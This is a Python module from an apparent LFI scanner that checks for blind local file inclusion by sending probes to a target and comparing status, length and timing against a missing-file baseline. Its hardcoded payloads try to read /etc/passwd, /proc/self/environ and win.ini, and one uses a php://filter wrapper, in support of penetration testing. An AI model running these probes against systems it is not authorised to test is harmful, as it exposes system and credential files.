import secrets

from .utils import attack, cook, parse_headers, parse_post_data
from .rich_output import colors, print_info, print_success


class BlindScan:
    """Heuristic checks for non-reflected/blind LFI behavior."""

    PROBE_PAIRS = [
        ("linux-passwd", "/etc/passwd"),
        ("proc-environ", "/proc/self/environ"),
        ("windows-winini", "C:/Windows/win.ini"),
        ("php-filter-passwd", "php://filter/convert.base64-encode/resource=/etc/passwd"),
    ]

    def __init__(self, args):
        self.target = args.url
        self.cookies = args.cookies
        self.method = getattr(args, "method", "GET")
        self.custom_headers = parse_headers(getattr(args, "headers", None))
        self.post_data = parse_post_data(getattr(args, "post_data", None))
        self.blind_list = getattr(args, "blind_list", None)

    def _load_probe_pairs(self):
        if not self.blind_list:
            return self.PROBE_PAIRS

        pairs = []
        with open(self.blind_list, "r") as payload_file:
            for line_number, line in enumerate(payload_file, 1):
                payload = line.strip()
                if not payload or payload.startswith("#"):
                    continue

                name = f"custom-{line_number}"
                if "=" in payload:
                    name, payload = payload.split("=", 1)
                    name = name.strip() or f"custom-{line_number}"
                    payload = payload.strip()

                pairs.append((name, payload))

        return pairs or self.PROBE_PAIRS

    def _request(self, payload):
        cookies = cook(self.cookies) if self.cookies else None
        return attack(
            self.target,
            payload,
            cookies=cookies,
            detection_mode=True,
            method=self.method,
            post_data=self.post_data,
            custom_headers=self.custom_headers,
        )

    @staticmethod
    def _signature(response):
        if not response:
            return {"status": None, "length": 0, "time": 0}
        elapsed = getattr(response, "elapsed", None)
        return {
            "status": response.status_code,
            "length": len(response.text or ""),
            "time": elapsed.total_seconds() if elapsed else 0,
        }

    @staticmethod
    def _score(existing, missing):
        score = 0
        reasons = []
        if existing["status"] != missing["status"]:
            score += 40
            reasons.append("status differs")
        length_delta = abs(existing["length"] - missing["length"])
        if length_delta > 100:
            score += 35
            reasons.append(f"content length differs by {length_delta}")
        time_delta = abs(existing["time"] - missing["time"])
        if time_delta > 1.0:
            score += 15
            reasons.append(f"response time differs by {time_delta:.2f}s")
        return min(score, 100), reasons

    def execute_blind_scan(self):
        print(colors("[~] Testing blind LFI response differences", 93))
        findings = []

        for name, existing_payload in self._load_probe_pairs():
            missing_payload = f"/tmp/liffy-missing-{secrets.token_hex(8)}"
            print_info(f"Comparing {name} against missing file baseline")

            existing = self._signature(self._request(existing_payload))
            missing = self._signature(self._request(missing_payload))
            score, reasons = self._score(existing, missing)

            if score >= 40:
                finding = {
                    "probe": name,
                    "payload": existing_payload,
                    "confidence": score,
                    "evidence": reasons,
                    "existing": existing,
                    "missing": missing,
                }
                findings.append(finding)
                print_success(
                    f"Blind LFI signal for {name} ({score}%): {', '.join(reasons)}"
                )

        if not findings:
            print(colors("[-] No blind LFI response differences detected.", 91))

        return findings
